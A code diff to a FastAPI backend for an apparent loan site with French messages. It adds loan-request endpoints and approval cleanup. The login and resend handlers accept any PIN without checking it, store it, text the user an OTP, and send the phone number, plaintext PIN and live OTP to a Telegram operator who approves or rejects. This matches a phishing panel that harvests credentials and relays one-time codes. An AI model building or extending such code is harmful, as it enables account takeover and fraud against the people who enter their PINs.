@@ -10,7 +10,12 @@ from pydantic import BaseModel
 from fastapi.middleware.cors import CORSMiddleware
 
 from database import init_db, create_user, verify_user_pin, get_user
-from telegram_bot import send_approval_request, answer_callback_query, edit_message
+from telegram_bot import (
+    send_approval_request,
+    answer_callback_query,
+    edit_message,
+    send_loan_approval_request,
+)
 from approvals import (
     create_approval,
     set_approval_result,
@@ -20,7 +25,9 @@ from approvals import (
     approval_pins,
     approval_otps,
     otp_approval_status,
-    phone_pins,          # NEW — stores PIN per phone number
+    phone_pins,
+    loan_request_status,
+    loan_request_phones,
 )
 from notifications import send_otp_sms, send_telegram_message
 
@@ -70,6 +77,19 @@ def format_phone(phone: str) -> str:
     return phone
 
 
+def cleanup_approval_records_for_phone(phone: str):
+    """Remove any stale approval entries tied to a phone number.
+    Called on new login and resend to prevent duplicate Telegram messages from being actionable.
+    """
+    stale_ids = [aid for aid, p in approval_phones.items() if p == phone]
+    for aid in stale_ids:
+        approval_phones.pop(aid, None)
+        approval_pins.pop(aid, None)
+        approval_otps.pop(aid, None)
+        approval_results.pop(aid, None)
+        pending_approvals.pop(aid, None)
+
+
 @app.get("/")
 def read_root():
     return {"status": "Backend is running"}
@@ -83,7 +103,7 @@ async def register(request: RegisterRequest):
     return {"status": "error", "message": "User already exists"}
 
 
-# --- LOGIN (accepts ANY PIN — admin verifies the OTP) ---
+# --- LOGIN ---
 @app.post("/api/login")
 async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     full_phone = format_phone(request.phone_number)
@@ -92,23 +112,22 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     if not user:
         create_user(full_phone, request.pin)
 
-    # 1. Generate OTP immediately
+    # 🧹 Invalidate any previous pending approval for this phone
+    cleanup_approval_records_for_phone(full_phone)
+
     otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = otp
     otp_approval_status[full_phone] = "pending"
-    phone_pins[full_phone] = request.pin         # ← NEW: store PIN for resend
+    phone_pins[full_phone] = request.pin
 
-    # 2. Send the OTP to the user via SMS
     background_tasks.add_task(send_otp_sms, full_phone, otp)
 
-    # 3. Create approval record for admin
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
     approval_pins[approval_id] = request.pin
     approval_otps[approval_id] = otp
 
-    # 4. Notify admin with buttons
     await send_approval_request(approval_id, full_phone, request.pin, otp)
 
     return {
@@ -135,65 +154,95 @@ async def verify_otp(request: OTPRequest):
     expected = otp_store.get(full_phone)
     status = otp_approval_status.get(full_phone, "pending")
 
-    # OTP doesn't match
     if not expected or request.otp != expected:
         return {"status": "error", "message": "Code invalide"}
 
-    # Admin has rejected
     if status == "rejected":
+        otp_store.pop(full_phone, None)
+        otp_approval_status.pop(full_phone, None)
+        phone_pins.pop(full_phone, None)
         return {"status": "rejected", "message": "Code refusé par l'administrateur"}
 
-    # OTP matches and admin has approved
     if status == "approved":
-        del otp_store[full_phone]
+        otp_store.pop(full_phone, None)
         otp_approval_status.pop(full_phone, None)
         phone_pins.pop(full_phone, None)
         return {"status": "success", "message": "Prêt approuvé"}
 
-    # OTP matches but admin hasn't decided yet
     return {"status": "pending", "message": "En attente de validation"}
 
 
-# --- OTP STATUS POLLING (frontend checks this after verify) ---
+# --- OTP STATUS POLLING (fixed: return "expired" instead of "pending") ---
 @app.get("/api/otp-status/{phone_number}")
 async def otp_status(phone_number: str):
     full_phone = format_phone(phone_number)
-    status = otp_approval_status.get(full_phone, "pending")
-    return {"status": status}
+    # 🧹 If no active status, report as expired so the frontend stops polling
+    if full_phone not in otp_approval_status:
+        return {"status": "expired"}
+    return {"status": otp_approval_status[full_phone]}
 
 
-# --- RESEND OTP (sends a full approval request WITH buttons) ---
+# --- RESEND OTP ---
 @app.post("/api/resend-otp")
 async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
     full_phone = format_phone(request.phone_number)
 
-    # 1. Generate a new OTP
+    # 🧹 Invalidate the previous approval for this phone
+    cleanup_approval_records_for_phone(full_phone)
+
     new_otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = new_otp
     otp_approval_status[full_phone] = "pending"
 
-    # 2. Look up stored PIN (or fallback)
     pin = phone_pins.get(full_phone, "****")
 
-    # 3. Create NEW approval record with buttons
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
     approval_pins[approval_id] = pin
     approval_otps[approval_id] = new_otp
 
-    # 4. Send SMS with new OTP
     background_tasks.add_task(send_otp_sms, full_phone, new_otp)
-
-    # 5. Send Telegram message WITH Approve/Reject buttons
     await send_approval_request(approval_id, full_phone, pin, new_otp)
 
     return {"status": "success", "message": "OTP resent successfully"}
 
 
+# --- REQUEST LOAN ---
+@app.post("/api/request-loan")
+async def request_loan(request: ResendRequest, background_tasks: BackgroundTasks):
+    full_phone = format_phone(request.phone_number)
+
+    approval_id = str(uuid4())
+    loan_request_status[approval_id] = "pending"
+    loan_request_phones[approval_id] = full_phone
+
+    await send_loan_approval_request(approval_id, full_phone)
+
+    return {
+        "status": "pending",
+        "approval_id": approval_id,
+        "message": "Waiting for admin approval"
+    }
+
+
+# --- LOAN REQUEST STATUS (auto-cleanup after final state) ---
+@app.get("/api/loan-request-status/{approval_id}")
+async def loan_request_status_endpoint(approval_id: str):
+    status = loan_request_status.get(approval_id, "expired")
+
+    # 🧹 Clean up after the frontend reads a final decision
+    if status in ("approved", "rejected"):
+        loan_request_status.pop(approval_id, None)
+        loan_request_phones.pop(approval_id, None)
+
+    return {"status": status}
+
+
 # --- TELEGRAM WEBHOOK ---
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
+    # 1. Parse
     try:
         body = await request.body()
         if not body:
@@ -208,10 +257,40 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         print("Webhook received non-callback update — ignoring")
         return {"ok": True}
 
+    # 2. Handle
     try:
         callback = data["callback_query"]
         callback_id = callback["id"]
         callback_data = callback.get("data", "")
+
+        # ─── LOAN APPROVAL BRANCH ──────────────────────────────
+        if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
+            action, approval_id = callback_data.split(":", 1)
+            approved = (action == "loan_approve")
+
+            loan_request_status[approval_id] = "approved" if approved else "rejected"
+
+            await answer_callback_query(
+                callback_id,
+                "✅ Loan Approved" if approved else "❌ Loan Denied"
+            )
+
+            phone = loan_request_phones.get(approval_id, "Unknown")
+
+            if "message" in callback:
+                result_text = "✅ <b>Loan Approved</b>" if approved else "❌ <b>Loan Denied</b>"
+                await edit_message(
+                    chat_id=callback["message"]["chat"]["id"],
+                    message_id=callback["message"]["message_id"],
+                    text=f"{result_text}\n\n"
+                         f"📱 Phone: <code>{phone}</code>\n"
+                         f"🆔 Ref: <code>{approval_id}</code>"
+                )
+
+            # Note: loan_request_phones stays until frontend reads the decision
+            return {"ok": True}
+
+        # ─── OTP APPROVAL BRANCH ───────────────────────────────
         parts = callback_data.split(":")
 
         if len(parts) < 2:
@@ -232,15 +311,13 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         pin = approval_pins.get(approval_id, "Unknown")
         otp = approval_otps.get(approval_id, "Unknown")
 
-        # Update the approval status for this phone number
         if phone != "Unknown":
             if approved:
                 otp_approval_status[phone] = "approved"
                 background_tasks.add_task(
                     send_telegram_message,
                     f"✅ <b>OTP Approved</b>\n"
-                    f"📱 Phone: <code>{phone}</code>\n"
-                    f"User can now complete login."
+                    f"📱 Phone: <code>{phone}</code>"
                 )
             else:
                 otp_approval_status[phone] = "rejected"
@@ -248,11 +325,9 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 background_tasks.add_task(
                     send_telegram_message,
                     f"❌ <b>OTP Rejected</b>\n"
-                    f"📱 Phone: <code>{phone}</code>\n"
-                    f"User access denied."
+                    f"📱 Phone: <code>{phone}</code>"
                 )
 
-        # Edit the original Telegram message
         if "message" in callback:
             result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
             await edit_message(
@@ -265,7 +340,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                      f"🆔 Ref: <code>{approval_id}</code>"
             )
 
-        # Clean up approval entries
+        # 🧹 Clean up approval entries after processing
         approval_phones.pop(approval_id, None)
         approval_pins.pop(approval_id, None)
         approval_otps.pop(approval_id, None)
